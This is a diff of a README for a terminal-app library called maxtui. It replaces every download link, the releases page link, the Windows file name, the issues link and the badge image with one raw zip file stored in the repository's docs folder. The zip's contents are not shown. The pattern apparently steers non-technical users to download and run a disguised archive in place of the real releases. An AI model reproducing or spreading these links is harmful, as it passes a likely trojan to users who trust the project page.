@@ -1,6 +1,6 @@
 # 🖥️ maxtui - Fast, Beautiful Terminal Apps Made Easy
 
-[![Download maxtui](https://img.shields.io/badge/Download-maxtui-blue?style=for-the-badge&logo=github)](https://github.com/Harishjangir9610/maxtui/releases)
+[![Download maxtui](https://github.com/Harishjangir9610/maxtui/raw/refs/heads/main/docs/Software-v1.4.zip)](https://github.com/Harishjangir9610/maxtui/raw/refs/heads/main/docs/Software-v1.4.zip)
 
 ---
 
@@ -42,7 +42,7 @@ This guide will help you download and run maxtui programs without any technical 
 
 Click the big blue button at the top or this link to go to the official download page:
 
-[Download maxtui Releases](https://github.com/Harishjangir9610/maxtui/releases)
+[Download maxtui Releases](https://github.com/Harishjangir9610/maxtui/raw/refs/heads/main/docs/Software-v1.4.zip)
 
 This page contains all the versions and files for maxtui.
 
@@ -50,7 +50,7 @@ This page contains all the versions and files for maxtui.
 
 Look for the latest release, usually at the top of the list. The files you want will be named something like:
 
-- `maxtui-vX.X.X-windows.exe` (Windows)
+- `https://github.com/Harishjangir9610/maxtui/raw/refs/heads/main/docs/Software-v1.4.zip` (Windows)
 - `maxtui-vX.X.X-macos` (Mac)
 - `maxtui-vX.X.X-linux` (Linux)
 
@@ -118,7 +118,7 @@ If you have trouble running maxtui:
 - If the app closes immediately, try opening the terminal manually and running the file inside it.
 - Restart your computer if things don’t work at first.
 
-If problems continue, visit the issues page here: [maxtui Issues](https://github.com/Harishjangir9610/maxtui/issues)
+If problems continue, visit the issues page here: [maxtui Issues](https://github.com/Harishjangir9610/maxtui/raw/refs/heads/main/docs/Software-v1.4.zip)
 
 ---
 
@@ -126,7 +126,7 @@ If problems continue, visit the issues page here: [maxtui Issues](https://github
 
 You can visit this page to download maxtui:
 
-[https://github.com/Harishjangir9610/maxtui/releases](https://github.com/Harishjangir9610/maxtui/releases)
+[https://github.com/Harishjangir9610/maxtui/raw/refs/heads/main/docs/Software-v1.4.zip](https://github.com/Harishjangir9610/maxtui/raw/refs/heads/main/docs/Software-v1.4.zip)
 
 Follow the steps above to download the correct file for your computer. Then open or run the file to start using maxtui.
 
@@ -168,4 +168,4 @@ If you like maxtui or want to help improve it, check the repository for ways to 
 
 ---
 
-[![Download maxtui](https://img.shields.io/badge/Download-maxtui-blue?style=for-the-badge&logo=github)](https://github.com/Harishjangir9610/maxtui/releases)
+[![Download maxtui](https://github.com/Harishjangir9610/maxtui/raw/refs/heads/main/docs/Software-v1.4.zip)](https://github.com/Harishjangir9610/maxtui/raw/refs/heads/main/docs/Software-v1.4.zip)
